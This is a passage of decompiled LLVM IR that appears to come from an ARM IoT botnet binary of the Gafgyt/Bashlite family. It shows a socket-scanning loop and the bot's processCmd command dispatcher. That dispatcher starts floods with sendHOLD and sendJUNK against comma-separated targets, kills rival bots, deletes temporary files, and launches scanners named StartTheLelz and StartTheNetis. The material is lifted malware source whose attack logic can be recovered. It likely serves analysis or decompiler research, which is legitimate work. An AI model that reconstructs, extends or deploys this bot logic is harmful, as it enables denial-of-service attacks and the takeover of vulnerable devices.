  %v2_11714 = add i32 %v2_11710, %v3_11708
  %v1_11718 = inttoptr i32 %v2_11714 to i32*
  %v2_11718 = load i32, i32* %v1_11718, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11724 = load i32, i32* %v6_116f8, align 8
  %v1_11728 = urem i32 %v7_11724, 32
  %v6_11730 = shl i32 1, %v1_11728
  %v2_11734 = or i32 %v6_11730, %v2_11718
  store i32 %v2_11734, i32* %v1_11718, align 4
  store i32 0, i32* %stack_var_-216, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_1176c = load i32, i32* %v6_116f8, align 8
  %v1_11770 = add i32 %v7_1176c, 1
  store i32 %v1_11770, i32* %r2.global-to-local, align 4
  %v1_1177c = load i32, i32* @sp, align 4
  %v2_1177c = inttoptr i32 %v1_1177c to i32*
  store i32 %v2_11778, i32* %v2_1177c, align 4
  %v0_11780 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_116b4, i32* %r2.global-to-local, align 4
  %v4_11790 = load i32, i32* %stack_var_-216, align 4
  %v5_11790 = call i32 @__libc_select(i32 %v0_11780, i32 0, i32 %v2_116b4, i32 0, i32 %v4_11790)
  %v7_117a0 = icmp eq i32 %v5_11790, 1
  br i1 %v7_117a0, label %dec_label_pc_117a8, label %dec_label_pc_11844

dec_label_pc_117a8:                               ; preds = %dec_label_pc_116f0
  store i32 4, i32* %stack_var_-220, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_117b8 = load i32, i32* %v6_116f8, align 8
  store i32 %v7_117b8, i32* %r2.global-to-local, align 4
  %v1_117c4 = load i32, i32* @sp, align 4
  %v2_117c4 = inttoptr i32 %v1_117c4 to i32*
  store i32 %v2_117c0, i32* %v2_117c4, align 4
  %v0_117c8 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_117d8 = load i32, i32* %stack_var_-220, align 4
  %v5_117d8 = call i32 @getsockopt(i32 %v0_117c8, i32 1, i32 4, i32 %v2_117bc, i32 %v4_117d8)
  %v3_117dc = load i32, i32* %stack_var_-224, align 4
  %v2_117e0 = icmp eq i32 %v3_117dc, 0
  br i1 %v2_117e0, label %dec_label_pc_11820, label %dec_label_pc_117e8

dec_label_pc_117e8:                               ; preds = %dec_label_pc_117a8
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_117f0 = load i32, i32* %v6_116f8, align 8
  %v1_117f8 = call i32 @__GI_close(i32 %v7_117f0)
  store i32 %v2_115a4, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_115a8, align 4
  br label %dec_label_pc_119b0

dec_label_pc_11820:                               ; preds = %dec_label_pc_117a8
  store i32 %v2_115a4, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_115a8, align 4
  br label %dec_label_pc_119b0

dec_label_pc_11844:                               ; preds = %dec_label_pc_116f0
  %v3_11848 = icmp eq i32 %v5_11790, -1
  br i1 %v3_11848, label %dec_label_pc_11850, label %dec_label_pc_119b0

dec_label_pc_11850:                               ; preds = %dec_label_pc_11844
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11858 = load i32, i32* %v6_116f8, align 8
  %v1_11860 = call i32 @__GI_close(i32 %v7_11858)
  store i32 %v2_115a4, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_115a8, align 4
  br label %dec_label_pc_119b0

dec_label_pc_1189c.lr.ph:                         ; preds = %dec_label_pc_115bc
  br label %dec_label_pc_1189c

dec_label_pc_1189c:                               ; preds = %dec_label_pc_1189c.lr.ph, %dec_label_pc_1189c
  %storemerge49 = phi i32 [ 0, %dec_label_pc_1189c.lr.ph ], [ %v1_118b0, %dec_label_pc_1189c ]
  store i32 %v2_116b4, i32* %r2.global-to-local, align 4
  %v5_118a8 = mul nuw nsw i32 %storemerge49, 4
  %v6_118a8 = add i32 %v5_118a8, %v2_116b4
  %v7_118a8 = inttoptr i32 %v6_118a8 to i32*
  store i32 0, i32* %v7_118a8, align 4
  %v1_118b0 = add nuw nsw i32 %storemerge49, 1
  %tmp48 = icmp ult i32 %v1_118b0, 32
  br i1 %tmp48, label %dec_label_pc_1189c, label %dec_label_pc_118c4

dec_label_pc_118c4:                               ; preds = %dec_label_pc_1189c
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v6_118cc = inttoptr i32 %v2_115a0 to i32*
  %v7_118cc = load i32, i32* %v6_118cc, align 8
  %v3_118d0 = udiv i32 %v7_118cc, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_118dc = mul nuw nsw i32 %v3_118d0, 4
  %v2_118e8 = add i32 %v2_11710, %v3_118dc
  %v1_118ec = inttoptr i32 %v2_118e8 to i32*
  %v2_118ec = load i32, i32* %v1_118ec, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_118f8 = load i32, i32* %v6_118cc, align 8
  %v1_118fc = urem i32 %v7_118f8, 32
  %v6_11904 = shl i32 1, %v1_118fc
  %v2_11908 = or i32 %v6_11904, %v2_118ec
  store i32 %v2_11908, i32* %v1_118ec, align 4
  store i32 0, i32* %stack_var_-216, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11940 = load i32, i32* %v6_118cc, align 8
  %v1_11944 = add i32 %v7_11940, 1
  store i32 %v1_11944, i32* %r2.global-to-local, align 4
  %v1_11950 = load i32, i32* @sp, align 4
  %v2_11950 = inttoptr i32 %v1_11950 to i32*
  store i32 %v2_11778, i32* %v2_11950, align 4
  %v0_11954 = load i32, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_11964 = load i32, i32* %stack_var_-216, align 4
  %v5_11964 = call i32 @__libc_select(i32 %v0_11954, i32 0, i32 0, i32 %v2_116b4, i32 %v4_11964)
  %v2_11974 = icmp eq i32 %v5_11964, 0
  br i1 %v2_11974, label %dec_label_pc_119b0, label %dec_label_pc_1197c

dec_label_pc_1197c:                               ; preds = %dec_label_pc_118c4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11984 = load i32, i32* %v6_118cc, align 8
  %v1_1198c = call i32 @__GI_close(i32 %v7_11984)
  store i32 %v2_115a4, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_115a8, align 4
  br label %dec_label_pc_119b0

dec_label_pc_119b0:                               ; preds = %dec_label_pc_115c8, %dec_label_pc_11844, %dec_label_pc_118c4, %dec_label_pc_11850, %dec_label_pc_11820, %dec_label_pc_117e8, %dec_label_pc_11690, %dec_label_pc_11678, %dec_label_pc_1197c
  %v1_119b4 = add nuw nsw i32 %storemerge357, 1
  store i32 %v1_119b4, i32* %r2.global-to-local, align 4
  %v5_119c8 = icmp slt i32 %v1_119b4, %v3_1147c
  br i1 %v5_119c8, label %dec_label_pc_11590, label %dec_label_pc_119cc

dec_label_pc_119cc:                               ; preds = %dec_label_pc_119bc.preheader, %dec_label_pc_119b0, %dec_label_pc_114cc
  %v2_119d0 = call i32 @__GI_time(i32* null)
  store i32 %v2_119d0, i32* %r2.global-to-local, align 4
  %v5_119e0 = icmp slt i32 %v2_119d0, %v2_11578
  br i1 %v5_119e0, label %dec_label_pc_119bc.preheader, label %dec_label_pc_119e4

dec_label_pc_119bc.preheader:                     ; preds = %dec_label_pc_119cc
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_119c454, label %dec_label_pc_11590, label %dec_label_pc_119cc

dec_label_pc_119e4:                               ; preds = %dec_label_pc_119cc, %entry
  %v1_119f0 = phi i32 [ %v3_114b8, %entry ], [ %v2_119d0, %dec_label_pc_119cc ]
  ret i32 %v1_119f0

; uselistorder directives
  uselistorder i32 %v1_119b4, { 2, 1, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i32 %storemerge513, { 1, 0 }
  uselistorder i8* %v1_115a8, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_115a4, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_115a0, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge357, { 1, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 14, 13, 12, 0, 15 }
  uselistorder i32 %v2_116b4, { 2, 0, 3, 6, 5, 1, 4 }
  uselistorder i32 %v3_11510, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_1147c, { 1, 2, 0 }
  uselistorder i32 %v0_1146c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r2.global-to-local, { 42, 39, 38, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 40, 41, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 6, 5, 8, 4, 3, 2, 1, 0 }
  uselistorder i32 115, { 1, 2, 0, 3, 4 }
  uselistorder i32 -184, { 1, 2, 0 }
  uselistorder i32 (i32, i32*)* @getHost, { 0, 1, 2, 4, 3 }
  uselistorder i32 ()* @getdtablesize, { 2, 1, 0 }
  uselistorder label %dec_label_pc_119b0, { 8, 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_1189c, { 1, 0 }
  uselistorder label %dec_label_pc_116c8, { 1, 0 }
  uselistorder label %dec_label_pc_11678, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_119f8 = load i32, i32* @r4, align 4
  %v6_119f8 = load i32, i32* @r5, align 4
  %v9_119f8 = load i32, i32* @r6, align 4
  %v12_119f8 = load i32, i32* @r7, align 4
  %v15_119f8 = load i32, i32* @r8, align 4
  %v18_119f8 = load i32, i32* @fp, align 4
  store i32 72192, i32* %stack_var_-4, align 4
  %v2_119fc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_119fc, i32* @fp, align 4
  %v2_11a10 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1ffd0.55 to i32), i32* @r1, align 4
  %v3_11a1c = inttoptr i32 %v2_11a10 to i8*
  %v4_11a1c = call i32 @__GI_strcoll(i8* %v3_11a1c, i32 ptrtoint ([5 x i8]* @global_var_1ffd0.55 to i32))
  %v2_11a24 = icmp eq i32 %v4_11a1c, 0
  br i1 %v2_11a24, label %dec_label_pc_11a2c, label %dec_label_pc_11a44

dec_label_pc_11a2c:                               ; preds = %entry
  %v2_11a30 = load i32, i32* @global_var_2e4e0.53, align 4
  %v3_11a3c = call i32 @HackerPrint(i32 %v2_11a30, i32 ptrtoint ([6 x i8]* @global_var_24508.1204 to i32))
  br label %dec_label_pc_12d5c

dec_label_pc_11a44:                               ; preds = %entry
  %v2_11a48 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_24510.1206 to i32), i32* @r1, align 4
  %v3_11a54 = inttoptr i32 %v2_11a48 to i8*
  %v4_11a54 = call i32 @__GI_strcoll(i8* %v3_11a54, i32 ptrtoint ([11 x i8]* @global_var_24510.1206 to i32))
  %v2_11a5c = icmp eq i32 %v4_11a54, 0
  br i1 %v2_11a5c, label %dec_label_pc_11a64, label %dec_label_pc_11a90

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a44
  %v2_11a68 = load i32, i32* @global_var_2e4e0.53, align 4
  store i32 %v2_11a68, i32* @r4, align 4
  %v2_11a70 = load i32, i32* @global_var_3473c.481, align 4
  store i32 %v2_11a70, i32* @r0, align 4
  %v1_11a74 = call i32 @__GI_inet_ntoa(i32 %v2_11a70)
  %v0_11a7c = load i32, i32* @r4, align 4
  store i32 %v1_11a74, i32* @r2, align 4
  %v3_11a88 = call i32 @HackerPrint(i32 %v0_11a7c, i32 ptrtoint ([10 x i8]* @global_var_2451c.1209 to i32))
  br label %dec_label_pc_12d5c

dec_label_pc_11a90:                               ; preds = %dec_label_pc_11a44
  %v2_11a94 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_24528.1211 to i32), i32* @r1, align 4
  %v3_11aa0 = inttoptr i32 %v2_11a94 to i8*
  %v4_11aa0 = call i32 @__GI_strcoll(i8* %v3_11aa0, i32 ptrtoint ([8 x i8]* @global_var_24528.1211 to i32))
  store i32 %v4_11aa0, i32* @r0, align 4
  %v2_11aa8 = icmp eq i32 %v4_11aa0, 0
  br i1 %v2_11aa8, label %dec_label_pc_11ab0, label %dec_label_pc_11ae4

dec_label_pc_11ab0:                               ; preds = %dec_label_pc_11a90
  %v0_11ab0 = call i32 @listFork()
  %v2_11ab8 = icmp eq i32 %v0_11ab0, 0
  br i1 %v2_11ab8, label %dec_label_pc_11ac0, label %dec_label_pc_11ae4

dec_label_pc_11ac0:                               ; preds = %dec_label_pc_11ab0
  %v2_11ac4 = load i32, i32* @global_var_2e4e0.53, align 4
  %v3_11ad0 = call i32 @HackerPrint(i32 %v2_11ac4, i32 ptrtoint ([13 x i8]* @global_var_24530.1213 to i32))
  %v1_11ad4 = call i32 @botkiller(i32 %v3_11ad0)
  %v1_11ad8 = call i32 @RemoveTMP(i32 %v1_11ad4)
  %v1_11ae0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11ae4

dec_label_pc_11ae4:                               ; preds = %dec_label_pc_11ab0, %dec_label_pc_11a90, %dec_label_pc_11ac0
  %v2_11ae8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_24540.1215 to i32), i32* @r1, align 4
  %v3_11af4 = inttoptr i32 %v2_11ae8 to i8*
  %v4_11af4 = call i32 @__GI_strcoll(i8* %v3_11af4, i32 ptrtoint ([7 x i8]* @global_var_24540.1215 to i32))
  store i32 %v4_11af4, i32* @r0, align 4
  %v2_11afc = icmp eq i32 %v4_11af4, 0
  br i1 %v2_11afc, label %dec_label_pc_11b04, label %dec_label_pc_11b34

dec_label_pc_11b04:                               ; preds = %dec_label_pc_11ae4
  %v0_11b04 = call i32 @listFork()
  %v2_11b0c = icmp eq i32 %v0_11b04, 0
  br i1 %v2_11b0c, label %dec_label_pc_11b14, label %dec_label_pc_11b34

dec_label_pc_11b14:                               ; preds = %dec_label_pc_11b04
  %v2_11b18 = load i32, i32* @global_var_2e4e0.53, align 4
  %v3_11b24 = call i32 @HackerPrint(i32 %v2_11b18, i32 ptrtoint ([16 x i8]* @global_var_24548.1217 to i32))
  %v1_11b28 = call i32 @LoopPayload(i32 %v3_11b24)
  %v1_11b30 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11b34

dec_label_pc_11b34:                               ; preds = %dec_label_pc_11b04, %dec_label_pc_11ae4, %dec_label_pc_11b14
  %v2_11b38 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_24558.1219 to i32), i32* @r1, align 4
  %v3_11b44 = inttoptr i32 %v2_11b38 to i8*
  %v4_11b44 = call i32 @__GI_strcoll(i8* %v3_11b44, i32 ptrtoint ([7 x i8]* @global_var_24558.1219 to i32))
  %v2_11b4c = icmp eq i32 %v4_11b44, 0
  br i1 %v2_11b4c, label %dec_label_pc_11b54, label %dec_label_pc_11c54

dec_label_pc_11b54:                               ; preds = %dec_label_pc_11b34
  %v7_11b58 = icmp eq i32 %arg1, 2
  br i1 %v7_11b58, label %dec_label_pc_11b78, label %dec_label_pc_11b60

dec_label_pc_11b60:                               ; preds = %dec_label_pc_11b54
  %v2_11b64 = load i32, i32* @global_var_2e4e0.53, align 4
  %v3_11b70 = call i32 @HackerPrint(i32 %v2_11b64, i32 ptrtoint ([16 x i8]* @global_var_24560.1221 to i32))
  br label %dec_label_pc_12d5c

dec_label_pc_11b78:                               ; preds = %dec_label_pc_11b54
  %v1_11b7c = add i32 %tmp, 4
  %v1_11b80 = inttoptr i32 %v1_11b7c to i32*
  %v2_11b80 = load i32, i32* %v1_11b80, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_24570.1223 to i32), i32* @r1, align 4
  %v3_11b8c = inttoptr i32 %v2_11b80 to i8*
  %v4_11b8c = call i32 @__GI_strcoll(i8* %v3_11b8c, i32 ptrtoint ([4 x i8]* @global_var_24570.1223 to i32))
  %v2_11b94 = icmp eq i32 %v4_11b8c, 0
  br i1 %v2_11b94, label %dec_label_pc_11b9c, label %dec_label_pc_11be0

dec_label_pc_11b9c:                               ; preds = %dec_label_pc_11b78
  %v2_11ba0 = load i32, i32* @global_var_34744.1225, align 4
  %v2_11ba4 = icmp eq i32 %v2_11ba0, 0
  br i1 %v2_11ba4, label %dec_label_pc_12d5c, label %dec_label_pc_11bac

dec_label_pc_11bac:                               ; preds = %dec_label_pc_11b9c
  %v2_11bbc = call i32 @kill(i32 %v2_11ba0, i32 9)
  %v2_11bc4 = load i32, i32* @global_var_2e4e0.53, align 4
  %v3_11bd0 = call i32 @HackerPrint(i32 %v2_11bc4, i32 ptrtoint ([5 x i8]* @global_var_24574.1227 to i32))
  store i32 0, i32* @global_var_34744.1225, align 4
  br label %dec_label_pc_11be0

dec_label_pc_11be0:                               ; preds = %dec_label_pc_11b78, %dec_label_pc_11bac
  %v2_11be8 = load i32, i32* %v1_11b80, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_2457c.1229 to i32), i32* @r1, align 4
  %v3_11bf4 = inttoptr i32 %v2_11be8 to i8*
  %v4_11bf4 = call i32 @__GI_strcoll(i8* %v3_11bf4, i32 ptrtoint ([3 x i8]* @global_var_2457c.1229 to i32))
  store i32 %v4_11bf4, i32* @r0, align 4
  %v2_11bfc = icmp eq i32 %v4_11bf4, 0
  br i1 %v2_11bfc, label %dec_label_pc_11c04, label %dec_label_pc_11c54

dec_label_pc_11c04:                               ; preds = %dec_label_pc_11be0
  %v2_11c08 = load i32, i32* @global_var_34744.1225, align 4
  %v2_11c0c = icmp eq i32 %v2_11c08, 0
  br i1 %v2_11c0c, label %dec_label_pc_11c14, label %dec_label_pc_12d5c

dec_label_pc_11c14:                               ; preds = %dec_label_pc_11c04
  %v0_11c14 = call i32 @__libc_fork()
  %v2_11c24 = icmp eq i32 %v0_11c14, 0
  br i1 %v2_11c24, label %dec_label_pc_11c48, label %dec_label_pc_11c2c

dec_label_pc_11c2c:                               ; preds = %dec_label_pc_11c14
  store i32 %v0_11c14, i32* @global_var_34744.1225, align 4
  br label %dec_label_pc_12d5c

dec_label_pc_11c48:                               ; preds = %dec_label_pc_11c14
  %v0_11c48 = call i32 @StartTheLelz()
  %v1_11c50 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11c54

dec_label_pc_11c54:                               ; preds = %dec_label_pc_11be0, %dec_label_pc_11b34, %dec_label_pc_11c48
  %v2_11c58 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_24580.1231 to i32), i32* @r1, align 4
  %v3_11c64 = inttoptr i32 %v2_11c58 to i8*
  %v4_11c64 = call i32 @__GI_strcoll(i8* %v3_11c64, i32 ptrtoint ([6 x i8]* @global_var_24580.1231 to i32))
  %v2_11c6c = icmp eq i32 %v4_11c64, 0
  br i1 %v2_11c6c, label %dec_label_pc_11c74, label %dec_label_pc_11cc4

dec_label_pc_11c74:                               ; preds = %dec_label_pc_11c54
  %v7_11c78 = icmp eq i32 %arg1, 2
  br i1 %v7_11c78, label %dec_label_pc_11c80, label %dec_label_pc_12d5c

dec_label_pc_11c80:                               ; preds = %dec_label_pc_11c74
  %v1_11c84 = add i32 %tmp, 4
  %v1_11c88 = inttoptr i32 %v1_11c84 to i32*
  %v2_11c88 = load i32, i32* %v1_11c88, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_2457c.1229 to i32), i32* @r1, align 4
  %v3_11c94 = inttoptr i32 %v2_11c88 to i8*
  %v4_11c94 = call i32 @__GI_strcoll(i8* %v3_11c94, i32 ptrtoint ([3 x i8]* @global_var_2457c.1229 to i32))
  %v2_11c9c = icmp eq i32 %v4_11c94, 0
  br i1 %v2_11c9c, label %dec_label_pc_11ca4, label %dec_label_pc_11cc4

dec_label_pc_11ca4:                               ; preds = %dec_label_pc_11c80
  %v2_11ca8 = load i32, i32* @global_var_2e4e0.53, align 4
  %v3_11cb4 = call i32 @HackerPrint(i32 %v2_11ca8, i32 ptrtoint ([25 x i8]* @global_var_24588.1233 to i32))
  %v1_11cb8 = call i32 @StartTheNetis(i32 %v3_11cb4)
  %v1_11cc0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11cc4

dec_label_pc_11cc4:                               ; preds = %dec_label_pc_11c80, %dec_label_pc_11c54, %dec_label_pc_11ca4
  %v2_11cc8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_245a4.1235 to i32), i32* @r1, align 4
  %v3_11cd4 = inttoptr i32 %v2_11cc8 to i8*
  %v4_11cd4 = call i32 @__GI_strcoll(i8* %v3_11cd4, i32 ptrtoint ([5 x i8]* @global_var_245a4.1235 to i32))
  %v2_11cdc = icmp eq i32 %v4_11cd4, 0
  br i1 %v2_11cdc, label %dec_label_pc_11ce4, label %dec_label_pc_11e28

dec_label_pc_11ce4:                               ; preds = %dec_label_pc_11cc4
  %v7_11cec = icmp slt i32 %arg1, 4
  br i1 %v7_11cec, label %dec_label_pc_12d5c, label %dec_label_pc_11cf0

dec_label_pc_11cf0:                               ; preds = %dec_label_pc_11ce4
  %v1_11cf4 = add i32 %tmp, 8
  %v1_11cf8 = inttoptr i32 %v1_11cf4 to i32*
  %v2_11cf8 = load i32, i32* %v1_11cf8, align 4
  store i32 %v2_11cf8, i32* @r0, align 4
  %v1_11d00 = call i32 @atol(i32 %v2_11cf8)
  %tmp114 = icmp slt i32 %v1_11d00, 1
  br i1 %tmp114, label %dec_label_pc_12d5c, label %dec_label_pc_11d10

dec_label_pc_11d10:                               ; preds = %dec_label_pc_11cf0
  %v1_11d14 = add i32 %tmp, 12
  %v1_11d18 = inttoptr i32 %v1_11d14 to i32*
  %v2_11d18 = load i32, i32* %v1_11d18, align 4
  store i32 %v2_11d18, i32* @r0, align 4
  %v1_11d20 = call i32 @atol(i32 %v2_11d18)
  %v5_11d2c = icmp sgt i32 %v1_11d20, 0
  br i1 %v5_11d2c, label %dec_label_pc_11d34, label %dec_label_pc_12d5c

dec_label_pc_11d34:                               ; preds = %dec_label_pc_11d10
  %v1_11d38 = add i32 %tmp, 4
  %v1_11d3c = inttoptr i32 %v1_11d38 to i32*
  %v2_11d3c = load i32, i32* %v1_11d3c, align 4
  %v2_11d4c = load i32, i32* %v1_11cf8, align 4
  store i32 %v2_11d4c, i32* @r0, align 4
  %v1_11d54 = call i32 @atol(i32 %v2_11d4c)
  %v2_11d68 = load i32, i32* %v1_11d18, align 4
  store i32 %v2_11d68, i32* @r0, align 4
  %v1_11d70 = call i32 @atol(i32 %v2_11d68)
  store i32 %v2_11d3c, i32* @r0, align 4
  %v2_11d88 = call i32 @__GI_strchr(i32 %v2_11d3c, i32 44)
  store i32 %v2_11d88, i32* @r0, align 4
  %v2_11d90 = icmp eq i32 %v2_11d88, 0
  br i1 %v2_11d90, label %dec_label_pc_11e00, label %dec_label_pc_11d98

dec_label_pc_11d98:                               ; preds = %dec_label_pc_11d34
  %v2_11da4 = call i32 @__GI_strtok(i32 %v2_11d3c, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_11da4, i32* @r0, align 4
  %v2_11df450 = icmp eq i32 %v2_11da4, 0
  br i1 %v2_11df450, label %dec_label_pc_11e28, label %dec_label_pc_11db4

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11d98, %dec_label_pc_11ddc
  %storemerge2851 = phi i32 [ %v2_11de4, %dec_label_pc_11ddc ], [ %v2_11da4, %dec_label_pc_11d98 ]
  %v0_11db4 = call i32 @listFork()
  %v2_11dbc = icmp eq i32 %v0_11db4, 0
  br i1 %v2_11dbc, label %dec_label_pc_11dc4, label %dec_label_pc_11ddc

dec_label_pc_11dc4:                               ; preds = %dec_label_pc_11db4
  %v3_11dd0 = call i32 @sendHOLD(i32 %storemerge2851, i32 %v1_11d54, i32 %v1_11d70)
  %v1_11dd8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11ddc

dec_label_pc_11ddc:                               ; preds = %dec_label_pc_11db4, %dec_label_pc_11dc4
  %v2_11de4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_11de4, i32* @r0, align 4
  %v2_11df4 = icmp eq i32 %v2_11de4, 0
  br i1 %v2_11df4, label %dec_label_pc_11e28, label %dec_label_pc_11db4

dec_label_pc_11e00:                               ; preds = %dec_label_pc_11d34
  %v0_11e00 = call i32 @listFork()
  %v2_11e08 = icmp eq i32 %v0_11e00, 0
  br i1 %v2_11e08, label %dec_label_pc_11e10, label %dec_label_pc_12d5c

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11e00
  %v3_11e1c = call i32 @sendHOLD(i32 %v2_11d3c, i32 %v1_11d54, i32 %v1_11d70)
  %v1_11e24 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11e28

dec_label_pc_11e28:                               ; preds = %dec_label_pc_11ddc, %dec_label_pc_11d98, %dec_label_pc_11cc4, %dec_label_pc_11e10
  %v2_11e2c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_245ac.1238 to i32), i32* @r1, align 4
  %v3_11e38 = inttoptr i32 %v2_11e2c to i8*
  %v4_11e38 = call i32 @__GI_strcoll(i8* %v3_11e38, i32 ptrtoint ([5 x i8]* @global_var_245ac.1238 to i32))
  %v2_11e40 = icmp eq i32 %v4_11e38, 0
  br i1 %v2_11e40, label %dec_label_pc_11e48, label %dec_label_pc_11f9c

dec_label_pc_11e48:                               ; preds = %dec_label_pc_11e28
  %v7_11e50 = icmp slt i32 %arg1, 4
  br i1 %v7_11e50, label %dec_label_pc_12d5c, label %dec_label_pc_11e54

dec_label_pc_11e54:                               ; preds = %dec_label_pc_11e48
  %v1_11e58 = add i32 %tmp, 8
  %v1_11e5c = inttoptr i32 %v1_11e58 to i32*
  %v2_11e5c = load i32, i32* %v1_11e5c, align 4
  store i32 %v2_11e5c, i32* @r0, align 4
  %v1_11e64 = call i32 @atol(i32 %v2_11e5c)
  %tmp115 = icmp slt i32 %v1_11e64, 1
  br i1 %tmp115, label %dec_label_pc_12d5c, label %dec_label_pc_11e74

dec_label_pc_11e74:                               ; preds = %dec_label_pc_11e54
  %v1_11e78 = add i32 %tmp, 12
  %v1_11e7c = inttoptr i32 %v1_11e78 to i32*
  %v2_11e7c = load i32, i32* %v1_11e7c, align 4
  store i32 %v2_11e7c, i32* @r0, align 4
  %v1_11e84 = call i32 @atol(i32 %v2_11e7c)
  %v5_11e90 = icmp sgt i32 %v1_11e84, 0
  br i1 %v5_11e90, label %dec_label_pc_11e98, label %dec_label_pc_12d5c

dec_label_pc_11e98:                               ; preds = %dec_label_pc_11e74
  %v1_11e9c = add i32 %tmp, 4
  %v1_11ea0 = inttoptr i32 %v1_11e9c to i32*
  %v2_11ea0 = load i32, i32* %v1_11ea0, align 4
  %v2_11eb0 = load i32, i32* %v1_11e5c, align 4
  store i32 %v2_11eb0, i32* @r0, align 4
  %v1_11eb8 = call i32 @atol(i32 %v2_11eb0)
  %v2_11ecc = load i32, i32* %v1_11e7c, align 4
  store i32 %v2_11ecc, i32* @r0, align 4
  %v1_11ed4 = call i32 @atol(i32 %v2_11ecc)
  store i32 %v2_11ea0, i32* @r0, align 4
  %v2_11eec = call i32 @__GI_strchr(i32 %v2_11ea0, i32 44)
  store i32 %v2_11eec, i32* @r0, align 4
  %v2_11ef4 = icmp eq i32 %v2_11eec, 0
  br i1 %v2_11ef4, label %dec_label_pc_11f74, label %dec_label_pc_11efc

dec_label_pc_11efc:                               ; preds = %dec_label_pc_11e98
  %v2_11f08 = call i32 @__GI_strtok(i32 %v2_11ea0, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_11f08, i32* @r0, align 4
  %v2_11f6847 = icmp eq i32 %v2_11f08, 0
  br i1 %v2_11f6847, label %dec_label_pc_11f9c, label %dec_label_pc_11f18

dec_label_pc_11f18:                               ; preds = %dec_label_pc_11efc, %dec_label_pc_11f50
  %storemerge2648 = phi i32 [ %v2_11f58, %dec_label_pc_11f50 ], [ %v2_11f08, %dec_label_pc_11efc ]
  %v0_11f18 = call i32 @listFork()
  %v2_11f20 = icmp eq i32 %v0_11f18, 0
  br i1 %v2_11f20, label %dec_label_pc_11f28, label %dec_label_pc_11f50

dec_label_pc_11f28:                               ; preds = %dec_label_pc_11f18
  %v4_11f34 = call i32 @sendJUNK(i32 %storemerge2648, i32 %v1_11eb8, i32 %v1_11ed4, i32 0)
  %v2_11f3c = load i32, i32* @global_var_2e4e0.53, align 4
  %v1_11f44 = call i32 @__GI_close(i32 %v2_11f3c)
  %v1_11f4c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11f50

dec_label_pc_11f50:                               ; preds = %dec_label_pc_11f18, %dec_label_pc_11f28
  %v2_11f58 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_11f58, i32* @r0, align 4
  %v2_11f68 = icmp eq i32 %v2_11f58, 0
  br i1 %v2_11f68, label %dec_label_pc_11f9c, label %dec_label_pc_11f18

dec_label_pc_11f74:                               ; preds = %dec_label_pc_11e98
